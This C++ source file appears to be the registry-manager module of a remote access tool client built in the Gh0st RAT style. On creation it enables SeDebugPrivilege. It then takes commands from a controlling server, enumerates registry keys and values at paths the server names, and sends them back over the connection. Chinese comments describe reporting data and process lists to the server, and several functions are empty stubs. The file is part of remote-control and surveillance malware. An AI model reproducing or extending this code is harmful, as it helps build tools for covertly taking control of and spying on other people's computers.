#include "pch.h"
#include "RegisterManager.h"
#include "ProcessHelper.h"
#include "Common.h"
#include "RegisterHelper.h"

CRegisterManager::CRegisterManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	//回传数据包到服务器

	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	//当前客户端扫描所有正在运行的进程信息

	BYTE IsToken = CLIENT_REGISTER_MANAGER_REPLY;
	m_IocpClient->OnSending((char*)&IsToken, 1);



}

CRegisterManager::~CRegisterManager()
{
	_tprintf(_T("~CRegisterManager()\r\n"));
	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

BOOL CRegisterManager::SendClientProcessList()
{
	return 0;
}

void CRegisterManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_REGISTER_MANAGER_DATA_CONTINUE:
	{
		if (BufferLength > 3)
		{
			FindRegisterData(BufferData[1], (char*)(BufferData + 2));
		}
		else
		{
			FindRegisterData(BufferData[1], NULL);   //Root数据
		}
		break;
	}
	//数据结构


	}
}

VOID CRegisterManager::FindRegisterData(char IsToken, char* KeyPath)
{
	CRegister  Register(IsToken);
	if (KeyPath != NULL)
	{
		Register.SetPath(KeyPath);
	}
	char* BufferData = Register.FindPath();
	if (BufferData != NULL)
	{
		m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
		//目录下的目录
		LocalFree(BufferData);
	}
	BufferData = Register.FindKey();
	if (BufferData != NULL) {


		//目录下的文件
		m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
		LocalFree(BufferData);
	}
}

void CRegisterManager::AddPath(char* BufferData)
{
}

void CRegisterManager::AddKey(char* BufferData)
{
}
